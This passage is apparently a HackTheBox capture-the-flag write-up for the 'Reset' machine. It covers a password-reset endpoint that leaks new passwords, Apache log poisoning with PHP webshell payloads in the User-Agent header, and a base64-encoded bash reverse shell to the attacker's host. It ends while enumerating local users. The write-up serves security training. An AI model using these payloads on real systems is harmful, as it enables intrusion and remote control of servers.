@@ -1,0 +1,592 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Reset</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-reset">htb-reset</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#ubuntu">ubuntu</a> <a class="post-tag" href="/tags#berkeley-r-commands">berkeley-r-commands</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#burp">burp</a> <a class="post-tag" href="/tags#burp-proxy">burp-proxy</a> <a class="post-tag" href="/tags#burp-repeater">burp-repeater</a> <a class="post-tag" href="/tags#php">php</a> <a class="post-tag" href="/tags#log-poisoning">log-poisoning</a> <a class="post-tag" href="/tags#rlogin">rlogin</a> <a class="post-tag" href="/tags#tmux">tmux</a> <a class="post-tag" href="/tags#nano">nano</a> <a class="post-tag" href="/tags#wireshark">wireshark</a> </span><br/><br/>
+<time class="dt-published" datetime="2025-07-15T09:00:00+00:00" itemprop="datePublished">Jul 15, 2025
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2025/07/15/htb-reset.html" style="color: #e6e6e6; text-decoration: none;">HTB: Reset</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="/img/reset-cover.webp" type="image/webp"/>
+<img alt="Reset" class="include_image" loading="lazy" src="/img/reset-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:150px;">
+</img></picture>
+<p>Reset has a website where the reset password API sends the new password back in the response to the request, by passing the need to have access to the account email. I’ll exploit a log poisoning vulnerability to get RCE. From there, I’ll abuse Berkeley r commands to get access as the next user, and find a password in a running tmux session. For root, I’ll abuse sudo nano. In Beyond Root, I’ll look at the web source and what the rlogin command looks like on the wire.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/680 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/reset" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Reset</a> <a href="https://hackthebox.com/machines/reset" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-reset.webp" type="image/webp"/> <img alt="Reset" class="img-av" src="/icons/box-reset.png"/></picture></a><br/><a href="https://hackthebox.com/machines/reset" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1945891296490541169">15 Jul 2025</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">15 Jul 2025</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Easy">Easy [20]</span></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/13569" rel="noopener" target="_blank"><img alt="xct" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/13569" style="display: unset"/><span class="user-text" style="display: none"> xct</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="initial-scanning">Initial Scanning</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds five open TCP ports, SSH (22), HTTP (80), and unknown services on 512-514:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.129.234.130
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-03 20:24 UTC
+Nmap scan report for 10.129.234.130
+Host is up (0.092s latency).
+Not shown: 65530 closed tcp ports (reset)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+512/tcp open  exec
+513/tcp open  login
+514/tcp open  shell
+
+Nmap done: 1 IP address (1 host up) scanned in 7.55 seconds
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80,512-514 <span class="nt">-sCV</span> 10.129.234.130
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-03 20:25 UTC
+Nmap scan report for 10.129.234.130
+Host is up (0.090s latency).
+
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 6a:16:1f:c8:fe:fd:e3:98:a6:85:cf:fe:7b:0e:60:aa (ECDSA)
+|_  256 e4:08:cc:5f:8e:56:25:8f:38:c3:ec:df:b8:86:0c:69 (ED25519)
+80/tcp  open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Admin Login
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+512/tcp open  exec    netkit-rsh rexecd
+513/tcp open  login?
+514/tcp open  shell   Netkit rshd
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 44.39 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="/cheatsheets/os#ubuntu">OpenSSH and Apache</a> versions, the host is likely running Ubuntu 22.04 jammy LTS (but could also be 22.10 kenetic).</p>
+<p>TCP 512-514 are related to the <a href="https://en.wikipedia.org/wiki/Berkeley_r-commands">Berkeley r-commands</a>. There’s nothing to really do with these now, but I’ll come back to them later.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The site just presents a page for an admin login:</p>
+<picture>
+<source srcset="/img/image-20250603163112969.webp" type="image/webp"/>
+<img alt="image-20250603163112969" class="include_image" loading="lazy" src="/img/image-20250603163112969.png"/>
+</picture>
+<p>Simple guesses like admin/admin don’t work, and as far as I can tell, there’s no different error message for invalid user and wrong password (though with just this, it’s always possible I just didn’t guess any valid usernames):</p>
+<picture>
+<source srcset="/img/image-20250603163137733.webp" type="image/webp"/>
+<img alt="image-20250603163137733" class="include_image" loading="lazy" src="/img/image-20250603163137733.png"/>
+</picture>
+<p>The “Forgot Password?” link loads an overlay:</p>
+<picture>
+<source srcset="/img/image-20250603163257727.webp" type="image/webp"/>
+<img alt="image-20250603163257727" class="include_image" loading="lazy" src="/img/image-20250603163257727.png"/>
+</picture>
+<p>Entering 0xdf shows the user doesn’t exist:</p>
+<picture>
+<source srcset="/img/image-20250603163313702.webp" type="image/webp"/>
+<img alt="image-20250603163313702" class="include_image" loading="lazy" src="/img/image-20250603163313702.png"/>
+</picture>
+<p>However when I try admin, it works:</p>
+<picture>
+<source srcset="/img/image-20250603163330847.webp" type="image/webp"/>
+<img alt="image-20250603163330847" class="include_image" loading="lazy" src="/img/image-20250603163330847.png"/>
+</picture>
+<p>This allows me to enumerate users, but not much else I can do without finding a way to access the link/token/information that was presumably sent to the user via email.</p>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The response headers from the initial GET request to <code class="language-plaintext highlighter-rouge">/</code> show that the site sets a <code class="language-plaintext highlighter-rouge">PHPSESSID</code> cookie, so the is almost certainly running PHP:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Tue, 03 Jun 2025 20:45:57 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.52 (Ubuntu)</span>
+<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=h72dhq82diroa26qcbdjqip5e9; path=/</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">4125</span>
+<span class="na">Keep-Alive</span><span class="p">:</span> <span class="s">timeout=5, max=100</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">Keep-Alive</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+</code></pre></div></div>
+<p>The login form loads as <code class="language-plaintext highlighter-rouge">/index.php</code> as well.</p>
+<p>The 404 page is the <a href="/cheatsheets/404#apache--httpd">default Apache 404</a>:</p>
+<picture>
+<source srcset="/img/image-20250603163537587.webp" type="image/webp"/>
+<img alt="image-20250603163537587" class="include_image" loading="lazy" src="/img/image-20250603163537587.png"/>
+</picture>
+<p>The only two pages in my Burp history are <code class="language-plaintext highlighter-rouge">/</code> and <code class="language-plaintext highlighter-rouge">/reset_password.php</code>, which is where the POST request is sent when I try to reset.</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, and include <code class="language-plaintext highlighter-rouge">-x php</code> since I know the site is PHP:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.129.234.130 <span class="nt">-x</span> php
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.129.234.130
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-red">404</span><span class="go">      GET        9l       31w      276c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-red">403</span><span class="go">      GET        9l       28w      279c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       85l      213w     4125c http://10.129.234.130/index.php
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        1l        2w       27c http://10.129.234.130/reset_password.php
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       85l      213w     4125c http://10.129.234.130/
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        0l        0w        0c http://10.129.234.130/dashboard.php =&gt; </span><span class="feroxbuster-yellow">index.php</span><span class="go">
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 2m     30001/30001   0s      </span><span class="feroxbuster-green">found</span><span class="go">:4       </span><span class="feroxbuster-red">errors</span><span class="go">:1
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     30000/30000   268/s   http://10.129.234.130/
+</span></code></pre></div></div>
+<p>The only new page is <code class="language-plaintext highlighter-rouge">/dashboard.php</code>, but it’s redirecting to <code class="language-plaintext highlighter-rouge">index.php</code> almost certainly because the brute force is not authenticated.</p>
+<h4 id="request-analysis">Request Analysis</h4>
+<p>When I reset a password, there’s a POST request to <code class="language-plaintext highlighter-rouge">/reset_password.php</code>:</p>
+<picture>
+<source srcset="/img/image-20250603164615605.webp" type="image/webp"/>
+<img alt="image-20250603164615605" class="include_image" loading="lazy" src="/img/image-20250603164615605.png"/>
+</picture>
+<p>If the user doesn’t exist, it returns an error:</p>
+<picture>
+<source srcset="/img/image-20250603164630778.webp" type="image/webp"/>
+<img alt="image-20250603164630778" class="include_image" loading="lazy" src="/img/image-20250603164630778.png"/>
+</picture>
+<p>However, if the user does exist, it returns extra information:</p>
+<picture>
+<source srcset="/img/image-20250603164702711.webp" type="image/webp"/>
+<img alt="image-20250603164702711" class="include_image" loading="lazy" src="/img/image-20250603164702711.png"/>
+</picture>
+<p>The new password is in there! And it works to login. Taking a slight tangent, I can look at the JavaScript that makes this POST request in the page:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
+    <span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#resetPasswordForm</span><span class="dl">'</span><span class="p">).</span><span class="nf">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">submit</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">e</span><span class="p">.</span><span class="nf">preventDefault</span><span class="p">();</span>
+        <span class="kd">const</span> <span class="nx">username</span> <span class="o">=</span> <span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#resetUsername</span><span class="dl">'</span><span class="p">).</span><span class="nf">val</span><span class="p">();</span>
+        <span class="nx">$</span><span class="p">.</span><span class="nf">ajax</span><span class="p">({</span>
+            <span class="na">url</span><span class="p">:</span> <span class="dl">'</span><span class="s1">reset_password.php</span><span class="dl">'</span><span class="p">,</span>
+            <span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span>
+            <span class="na">data</span><span class="p">:</span> <span class="p">{</span> <span class="na">username</span><span class="p">:</span> <span class="nx">username</span> <span class="p">},</span>
+            <span class="na">success</span><span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#resetMessage</span><span class="dl">'</span><span class="p">).</span><span class="nf">removeClass</span><span class="p">(</span><span class="dl">'</span><span class="s1">alert-danger alert-success</span><span class="dl">'</span><span class="p">).</span><span class="nf">show</span><span class="p">();</span>
+                <span class="k">if </span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#resetMessage</span><span class="dl">'</span><span class="p">).</span><span class="nf">addClass</span><span class="p">(</span><span class="dl">'</span><span class="s1">alert-danger</span><span class="dl">'</span><span class="p">).</span><span class="nf">text</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">error</span><span class="p">);</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                    <span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#resetMessage</span><span class="dl">'</span><span class="p">).</span><span class="nf">addClass</span><span class="p">(</span><span class="dl">'</span><span class="s1">alert-success</span><span class="dl">'</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="s2">`
+                        Password reset successful!&lt;br&gt;
+                        Timestamp: </span><span class="p">${</span><span class="nx">data</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">}</span><span class="s2">
+                    `</span><span class="p">);</span>
+                <span class="p">}</span>
+            <span class="p">},</span>
+            <span class="na">error</span><span class="p">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+                <span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#resetMessage</span><span class="dl">'</span><span class="p">).</span><span class="nf">removeClass</span><span class="p">(</span><span class="dl">'</span><span class="s1">alert-success</span><span class="dl">'</span><span class="p">).</span><span class="nf">addClass</span><span class="p">(</span><span class="dl">'</span><span class="s1">alert-danger</span><span class="dl">'</span><span class="p">).</span><span class="nf">text</span><span class="p">(</span><span class="dl">'</span><span class="s1">An error occurred while resetting the password.</span><span class="dl">'</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">});</span>
+    <span class="p">});</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+<p>When the response is success, it just takes the timestamp, ignoring the password.</p>
+<h3 id="authenticated-site">Authenticated Site</h3>
+<h4 id="dashboard">Dashboard</h4>
+<p>On logging in, I’m presented with a simple dash board with a capability to load log files:</p>
+<picture>
+<source srcset="/img/image-20250603164829814.webp" type="image/webp"/>
+<img alt="image-20250603164829814" class="include_image" loading="lazy" src="/img/image-20250603164829814.png"/>
+</picture>
+<p>The dropdown menu offers <code class="language-plaintext highlighter-rouge">syslog</code> and <code class="language-plaintext highlighter-rouge">auth.log</code>. Clicking “View Logs” returns the logs:</p>
+<picture>
+<source srcset="/img/image-20250603170519710.webp" type="image/webp"/>
+<img alt="image-20250603170519710" class="include_image" loading="lazy" src="/img/image-20250603170519710.png"/>
+</picture>
+<p><code class="language-plaintext highlighter-rouge">auth.log</code> is empty, and even trying failed SSH logins doesn’t populate it.</p>
+<h4 id="post-requests">POST Requests</h4>
+<p>On clicking “View Logs”, a POST request is sent to Reset:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/dashboard.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.129.234.130</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate, br</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">26</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://10.129.234.130</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://10.129.234.130/dashboard.php</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=fa847n0ah4r3ea7gthb98ia0a6</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Priority</span><span class="p">:</span> <span class="s">u=0, i</span>
+
+file=%2Fvar%2Flog%2Fsyslog
+</code></pre></div></div>
+<p>The full path of the file is the parameter.</p>
+<h2 id="shell-as-www-data">Shell as www-data</h2>
+<h3 id="directory-traversal--file-read-fail">Directory Traversal / File Read [Fail]</h3>
+<p>My first thought is to try to change that path to something else, like <code class="language-plaintext highlighter-rouge">/etc/passwd</code>:</p>
+<picture>
+<source srcset="/img/image-20250603171638230.webp" type="image/webp"/>
+<img alt="image-20250603171638230" class="include_image" loading="lazy" src="/img/image-20250603171638230.png"/>
+</picture>
+<p>It fails. I can try using a relative path in case it’s checking the start of the path, but it still fails:</p>
+<picture>
+<source srcset="/img/image-20250603171603686.webp" type="image/webp"/>
+<img alt="image-20250603171603686" class="include_image" loading="lazy" src="/img/image-20250603171603686.png"/>
+</picture>
+<p>I’ll try other things like <code class="language-plaintext highlighter-rouge">/var/www/html/index.php</code>, but it does the same. I am able to read other logs, such as the Apache logs:</p>
+<picture>
+<source srcset="/img/image-20250603171759885.webp" type="image/webp"/>
+<img alt="image-20250603171759885" class="include_image" loading="lazy" src="/img/image-20250603171759885.png"/>
+</picture>
+<h3 id="command-injection-fail">Command Injection [Fail]</h3>
+<p>It is possible that the page is using some kind of OS call to fetch the file. I’ll try some simple command injection payloads, such as:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file=%2Fvar%2Flog%2fauth.log%3bid%3b
+</code></pre></div></div>
+<p>This is appending <code class="language-plaintext highlighter-rouge">;id;</code> to the end, so if the string were being passed to the OS for execution, it might inject the <code class="language-plaintext highlighter-rouge">id</code> command. I don’t see any results other than “Invalid file path”. I’ll try some other injections (like backticks, <code class="language-plaintext highlighter-rouge">&amp;</code>, <code class="language-plaintext highlighter-rouge">|</code>, and <code class="language-plaintext highlighter-rouge">$()</code>), and try some other commands (like pinging my host), but none work.</p>
+<h3 id="log-poisoning">Log Poisoning</h3>
+<h4 id="strategy">Strategy</h4>
+<p>I’ve already seen that I can get my <code class="language-plaintext highlighter-rouge">User-Agent</code> header into the <code class="language-plaintext highlighter-rouge">access.log</code> file. It’s possible that the PHP script is using <code class="language-plaintext highlighter-rouge">include</code> rather than <code class="language-plaintext highlighter-rouge">file_get_contents</code> to put the file contents into the page. If that were the case, then I could put some PHP into the <code class="language-plaintext highlighter-rouge">access.log</code> and then execute it.</p>
+<h4 id="poc">POC</h4>
+<p>I’ll make a request with a simple PHP command in the <code class="language-plaintext highlighter-rouge">User-Agent</code>:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/dashboard.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.129.234.130</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">0xdf &lt;?php system('id'); ?&gt;</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://10.129.234.130/dashboard.php</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=e8km0mt0nl6tm1om9dhgd0st1j</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">26</span>
+
+file=%2Fvar%2Flog%2fsyslog
+</code></pre></div></div>
+<p>Now I’ll use the page to load <code class="language-plaintext highlighter-rouge">/var/log/apache2/access.log</code>:</p>
+<picture>
+<source srcset="/img/image-20250603173306626.webp" type="image/webp"/>
+<img alt="image-20250603173306626" class="include_image" loading="lazy" src="/img/image-20250603173306626.png"/>
+</picture>
+<p>That’s RCE via log poisoning.</p>
+<h4 id="shell">Shell</h4>
+<p>I’ll repoison with a simple webshell:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/dashboard.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.129.234.130</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">0xdf: &lt;?php system($_REQUEST['cmd']); ?&gt;</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://10.129.234.130/index.php</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=e8km0mt0nl6tm1om9dhgd0st1j</span>
+</code></pre></div></div>
+<p>How I’ll load the poisoned log and add a <code class="language-plaintext highlighter-rouge">cmd</code> parameter:</p>
+<picture>
+<source srcset="/img/image-20250603174249815.webp" type="image/webp"/>
+<img alt="image-20250603174249815" class="include_image" loading="lazy" src="/img/image-20250603174249815.png"/>
+</picture>
+<p>I had a tricky time getting a straight <a href="https://www.youtube.com/watch?v=OjkVep2EIlw">bash reverse shell</a> to work, so I base64 encoded it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'bash  -c "bash -i &gt;&amp; /dev/tcp/10.10.14.79/443   0&gt;&amp;1"'</span> | <span class="nb">base64</span> 
+<span class="go">YmFzaCAgLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzkvNDQzICAgMD4mMSIK
+</span></code></pre></div></div>
+<p>And passed that:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file=%2Fvar%2Flog%2Fapache2%2faccess.log&amp;cmd=echo+YmFzaCAgLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzkvNDQzICAgMD4mMSIK|base64+-d|bash
+</code></pre></div></div>
+<p>I get a shell at <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.129.234.130 38646
+bash: cannot set terminal process group (1080): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">www-data@reset:/var/www/html$</span><span class="w">
+</span></code></pre></div></div>
+<p>I’ll upgrade my shell using <a href="https://www.youtube.com/watch?v=DqE6DxqJg8Q">the standard trick</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@reset:/var/www/html$</span><span class="w"> </span>script /dev/null <span class="nt">-c</span> bash
+<span class="go">script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+</span><span class="gp">www-data@reset:/var/www/html$</span><span class="w"> </span>^Z
+<span class="go">[1]+  Stopped                 nc -lnvp 443
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span> <span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lnvp 443
+            reset
+reset: unknown terminal type unknown
+Terminal type? screen
+</span><span class="gp">www-data@reset:/var/www/html$</span><span class="w"> 
+</span></code></pre></div></div>
+<p>And read the user flag from <code class="language-plaintext highlighter-rouge">/home/sadm</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@reset:/home/sadm$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">19ba954c************************
+</span></code></pre></div></div>
+<h2 id="shell-as-radm">Shell as radm</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="web">Web</h4>
+<p>The only webserver in <code class="language-plaintext highlighter-rouge">/var/www</code> is <code class="language-plaintext highlighter-rouge">html</code>, which has the page:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@reset:/var/www/html$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">dashboard.php  index.php  private_34eee5d2  reset_password.php
+</span></code></pre></div></div>
+<p>I’ll look at <code class="language-plaintext highlighter-rouge">dashboard.php</code> in <a href="#web-application-source">Beyond Root</a> to see why the directory traversal failed and the poisoning worked, but there’s nothing there to move forward.</p>
+<p>The <code class="language-plaintext highlighter-rouge">private_34eee5d2</code> directory has a SQLite db, which just has the admin’s hash:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@reset:/var/www/html$</span><span class="w"> </span>sqlite3 private_34eee5d2/db.sqlite .dump
+<span class="go">PRAGMA foreign_keys=OFF;
+BEGIN TRANSACTION;
+CREATE TABLE users (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    username TEXT NOT NULL UNIQUE,
+    password_hash TEXT NOT NULL,
+    is_admin INTEGER DEFAULT 0
+);
+INSERT INTO users VALUES(1,'admin','cca326e770bc57b4ab361962cba9a1427f895248',1);
+DELETE FROM sqlite_sequence;
+INSERT INTO sqlite_sequence VALUES('users',1);
+COMMIT;
+</span></code></pre></div></div>
+<p>It cracks to what I last reset it to.</p>
+<h4 id="users">Users</h4>
+<p>There are two users with home directories in <code class="language-plaintext highlighter-rouge">/home</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@reset:/home$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">local  sadm
+</span></code></pre></div></div>
+<p>www-data can’t enter or list <code class="language-plaintext highlighter-rouge">local</code>. The list of uses is consistent with the users who have shells set (plus root):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@reset:/$</span><span class="w"> </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> <span class="s1">'sh$'</span>
+<span class="go">root:x:0:0:root:/root:/bin/bash
+local:x:1000:1000:local:/home/local:/bin/bash
+sadm:x:1001:1001:,,,:/home/sadm:/bin/bash
